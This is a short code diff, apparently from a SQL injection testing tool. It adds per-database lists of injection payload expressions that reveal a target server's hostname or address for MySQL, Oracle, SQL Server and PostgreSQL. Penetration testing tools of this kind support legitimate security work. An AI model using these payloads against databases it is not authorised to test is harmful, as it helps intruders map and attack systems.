@@ -166,11 +166,20 @@ PAYLOADS_CURRENT_DATABASE = {
     "PostgreSQL": ["CURRENT_SCHEMA()", "(SELECT current_database())"],
 }
 
-# PAYLOADS_HOSTNAME = [
-#     "@@HOSTNAME",
-#     "HOST_NAME()",
-#     "(SELECT+CONCAT(boot_val)+FROM+pg_settings WHERE name='listen_addresses' GROUP BY boot_val)",
-# ]
+PAYLOADS_HOSTNAME = {
+    "MySQL": [
+        "@@HOSTNAME",
+    ],
+    "Oracle": [
+        "(SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL)",
+        "(SELECT host_name FROM v$instance)",
+    ],
+    "Microsoft SQL Server": ["@@SERVERNAME", "HOST_NAME()", "(SELECT HOST_NAME())"],
+    "PostgreSQL": [
+        "(SELECT CONCAT(boot_val) FROM pg_settings WHERE name='listen_addresses' GROUP BY boot_val)",
+        "(SELECT inet_server_addr())",
+    ],
+}
 
 PAYLOADS = {
     "BooleanTests": {
